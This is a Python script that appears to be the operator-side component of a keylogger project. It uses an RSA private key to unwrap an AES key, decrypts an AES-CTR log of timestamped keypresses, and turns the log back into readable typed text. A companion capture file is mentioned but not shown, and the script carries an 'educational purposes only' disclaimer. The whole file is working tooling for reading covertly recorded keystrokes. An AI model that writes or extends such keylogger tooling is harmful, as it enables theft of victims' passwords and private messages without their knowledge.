#/usr/bin/python3

# Warning Before Using :
# 1. This Project/Code/Script is provided "AS IS" Without any warranty 
# 2. This is done for Educational/Research Purpose ONLY.Full Responsibility is of the user using it.
# 3. I am not responsible for any harm/problem/issue that may occour, due to use of this code anywhere.
# Author : xtreme.research@gmail.com

import pyaes                                                       # To decrypt AES 
import sys                           
from Crypto.PublicKey import RSA                                   # To decrypt Encrypted AES Key 

fw = open('private_key.pem','r')                                   # Read RSA Private Key from file 
private_key = fw.read()                                            # Private Key can be provided in Source
fw.close()                                                         # Code too like WatchDog.py

class Base:
    def __init__(self,RSA_PRIVATE_KEY,LOG_FILE_NAME='LogFile.bin',KEY_FILE_NAME='AESKey.bin'):
        self.RSA_PRIVATE_KEY = RSA_PRIVATE_KEY                     
        self.LOG_FILE_NAME = LOG_FILE_NAME                         # logfile name to read from
        self.KEY_FILE_NAME = KEY_FILE_NAME                         # AES Key file name 
        
        self.init_RSA_Object()                                     # initialize a RSA object that can decrypt
        self.get_AES_Key()                                         # Get AES Key by decrypting AES_KEY file using RSA
        self.aes = self.generate_AES_Object()                      # generate AES object that can decrypt using the AES key

    def init_RSA_Object(self):
        self.RSA_Obj = RSA.importKey(self.RSA_PRIVATE_KEY)         # RSA Object
    
    def get_AES_Key(self):                                         # get Encrypted AES Key, Decrypt using RSA Private Key
        fw = open(self.KEY_FILE_NAME,'rb')
        enc_data = fw.read()
        self.RSA_Decrypt(enc_data)
        fw.close()
    
    def RSA_Decrypt(self,encrypted_data):                         # Decrypt Encrypted AES Key if Public and Private Key pair
        try:                                                      # Are correct. Else Key is Mismatched
            self.AES_KEY = self.RSA_Obj.decrypt(encrypted_data)
        except:
            print("RSA Key Mismatch!")
            exit()

    def generate_AES_Object(self):                                 # generate AES Onject from AES key
        aes = pyaes.AESModeOfOperationCTR(self.AES_KEY)            # AES Object can decrypt AES Encrypted logs
        return aes

    def load_logs(self):                                          # load logs into a list of plaintext data
        try:  
            fw = open(self.LOG_FILE_NAME,'rb')
            ciphertext = fw.read()
            fw.close()
            decrypted = self.aes.decrypt(ciphertext)              # decrypt using AES Key
            self.log = str(decrypted.decode()).split('\n')        # log-data into list conversion
        except:
            print("Exception Occoured!")
            print(sys.exc_info()[0])                              # print exception

    def pretty_print_logs(self):                                  # Print just the important Textual Data
        start_len = len("YYYY-MM-DD HH:MM:SS.MS-")                
        text_log = ""
        for event in self.log:
            data = event[start_len:]
            if len(data) == 3:
                data = data[1]
            else:
                data = data.lower()
                if data == 'key.space':
                    data = ' '
                elif data == 'key.enter':
                    data = '\n'
                else:
                    data = " " + data + " "
            text_log += data
        print(text_log)
        
    def print_all_logs(self):                          # Print all Logs Serially with date and time 
        for log_event in self.log:                     # of keypress. 
            print(log_event)

Y = Base(private_key)                                  # Initialize the class with Private Key 
Y.load_logs()                                          # load into memory
Y.pretty_print_logs()                                  # pretty print the logs
